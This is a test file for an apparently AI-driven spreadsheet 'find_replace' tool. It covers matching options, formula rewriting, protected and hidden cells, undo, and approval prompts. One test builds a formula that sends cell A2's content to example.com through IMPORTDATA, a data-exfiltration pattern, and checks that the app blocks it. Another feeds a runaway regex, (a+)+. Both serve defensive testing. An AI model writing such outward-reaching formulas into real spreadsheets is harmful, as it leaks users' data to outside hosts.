import { describe, expect, it, vi } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { runTool, describeCall, callTarget, changesWorkbook } from '../src/core/aitools.js';

function setup() {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const env = { sheetId: () => id, selection: () => ({ sheetId: id, range: { r1: 0, c1: 0, r2: 0, c2: 0 } }), distrust: vi.fn(), select: vi.fn(() => true) };
  const run = (name, args) => runTool(wb, name, args, env);
  run('write_cells', { start_cell: 'A1', values: [['Item', 'Region', 'Qty'], ['Apples', 'West', 3], ['Pears', 'west coast', 5], ['Plums', 'East', 2], ['Total', null, '=SUM(C2:C4)']] });
  wb.clearHistory();
  const json = (res) => JSON.parse(res.content.split('\n')[0]); // a note may follow the result
  return { wb, id, env, run, json };
}

describe('find_replace', () => {
  it('replaces text in the cells that hold it, as one undo step, and names them', () => {
    const { wb, id, run, json } = setup();
    const res = run('find_replace', { find: 'west', replace: 'Pacific' });
    expect(json(res)).toMatchObject({ replaced: 2, cells: ['Sheet1!B2', 'Sheet1!B3'] });
    expect(wb.getValue(id, 1, 1)).toBe('Pacific');
    expect(wb.getValue(id, 2, 1)).toBe('Pacific coast');
    expect(wb.undoLabels()).toHaveLength(1);
    wb.undo();
    expect(wb.getValue(id, 1, 1)).toBe('West');
    expect(changesWorkbook('find_replace')).toBe(true);
  });

  it('matches case and whole cells when asked', () => {
    const { wb, id, run, json } = setup();
    expect(json(run('find_replace', { find: 'west', replace: 'X', match_case: true })).cells).toEqual(['Sheet1!B3']);
    expect(wb.getValue(id, 1, 1)).toBe('West');
    expect(json(run('find_replace', { find: 'west', replace: 'Y', whole_cell: true })).cells).toEqual(['Sheet1!B2']);
  });

  it('rewrites formula text unless told to leave formulas alone', () => {
    const { wb, id, run, json } = setup();
    expect(json(run('find_replace', { find: 'C4', replace: 'C3', in_formulas: false })).replaced).toBe(0);
    expect(wb.getCell(id, 4, 2).f).toBe('SUM(C2:C4)');
    run('find_replace', { find: 'C4', replace: 'C3' });
    expect(wb.getCell(id, 4, 2).f).toBe('SUM(C2:C3)');
    expect(wb.getValue(id, 4, 2)).toBe(8);
  });

  it('leaves a formula found by its result alone, and says why', () => {
    const { run } = setup();
    const res = run('find_replace', { find: '10', replace: '11', whole_cell: true });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/formula results/);
  });

  it('searches the active sheet, a named sheet, a range, or every sheet', () => {
    const { wb, id, run, json } = setup();
    const other = wb.addSheet('Notes');
    wb.setInput(other.id, 0, 0, 'West side');
    expect(json(run('find_replace', { find: 'East', replace: 'Atlantic', range: 'B1:B3' })).replaced).toBe(0);
    expect(json(run('find_replace', { find: 'side', replace: 'end', sheet: 'Notes' })).cells).toEqual(['Notes!A1']);
    expect(wb.getValue(id, 1, 1)).toBe('West');
    const res = json(run('find_replace', { find: 'West', replace: 'W', all_sheets: true, whole_cell: false, match_case: true }));
    expect(res.cells).toEqual(['Sheet1!B2', 'Notes!A1']);
  });

  it('leaves hidden rows alone and says how many matches were there', () => {
    const { wb, id, run, json } = setup();
    wb.setHidden(id, 'row', [2], true);
    const res = json(run('find_replace', { find: 'west', replace: 'Pacific' }));
    expect(res.replaced).toBe(1);
    expect(res.note).toMatch(/1 in hidden rows or columns of Sheet1/);
    expect(wb.getValue(id, 2, 1)).toBe('west coast');
  });

  it('leaves protected cells alone, and says nothing could be replaced', () => {
    const { wb, id, run } = setup();
    wb.setSheetProtected(id, true);
    const before = wb.version;
    const res = run('find_replace', { find: 'West', replace: 'Pacific' });
    expect(res.ok).toBe(false);
    expect(res.content).toMatch(/2 protected/);
    expect(wb.version).toBe(before);
  });

  it('replaces with regular-expression groups', () => {
    const { wb, id, run } = setup();
    run('find_replace', { find: '^(\\w+) coast$', replace: '$1 shore', regex: true });
    expect(wb.getValue(id, 2, 1)).toBe('west shore');
    const bad = run('find_replace', { find: '(a+)+', replace: 'x', regex: true });
    expect(bad.ok).toBe(false);
  });

  it('holds back a formula the replacement makes reach outside the workbook', () => {
    const { wb, id, env, run, json } = setup();
    wb.setInput(id, 6, 0, "'=FETCH(A2)");
    const res = json(run('find_replace', { find: 'FETCH', replace: 'IMPORTDATA' }));
    expect(wb.getCell(id, 6, 0).v).toBe('=IMPORTDATA(A2)');
    expect(env.distrust).not.toHaveBeenCalled();
    expect(res.replaced).toBe(1);
    wb.setInput(id, 7, 0, 'TODO');
    const reached = json(run('find_replace', { find: 'TODO', replace: '=IMPORTDATA("https://example.com/"&A2)' }));
    expect(env.distrust).toHaveBeenCalled();
    expect(reached.blocked_note).toMatch(/#BLOCKED!/);
    expect(wb.getCell(id, 7, 0).f).toMatch(/^IMPORTDATA/);
  });

  it('says when nothing matches, and asks first when cells would change', () => {
    const { wb, env, run, json } = setup();
    expect(json(run('find_replace', { find: 'Kiwi', replace: 'x' }))).toMatchObject({ replaced: 0, note: 'No cells match.' });
    expect(run('find_replace', { find: 'Kiwi' }).ok).toBe(false);
    const d = describeCall(wb, 'find_replace', { find: 'west', replace: 'Pacific' }, env);
    expect(d).toMatchObject({ label: 'Replace “west” with “Pacific” on Sheet1', destructive: true, detail: 'Changes the 2 cells that match.' });
    expect(describeCall(wb, 'find_replace', { find: 'Kiwi', replace: 'x', all_sheets: true }, env)).toMatchObject({ label: 'Replace “Kiwi” with “x” on every sheet', destructive: false });
    expect(callTarget(wb, 'find_replace', { find: 'x', replace: 'y', range: 'B2:B4' }, env).range).toEqual({ r1: 1, c1: 1, r2: 3, c2: 1 });
  });

  it('counts in the approval only the cells the replacement changes, not the matches it leaves alone', () => {
    const { wb, id, env } = setup();
    // "10" is only in the total's result, which Replace leaves alone: nothing would change, so nothing is asked.
    expect(describeCall(wb, 'find_replace', { find: '10', replace: '11' }, env)).toMatchObject({ destructive: false, detail: null });
    // Of the two "West" cells one is protected, so one cell changes.
    wb.protectRange(id, { r1: 1, c1: 1, r2: 1, c2: 1 });
    expect(describeCall(wb, 'find_replace', { find: 'west', replace: 'Pacific' }, env).detail).toBe('Changes the 1 cell that matches.');
  });
});
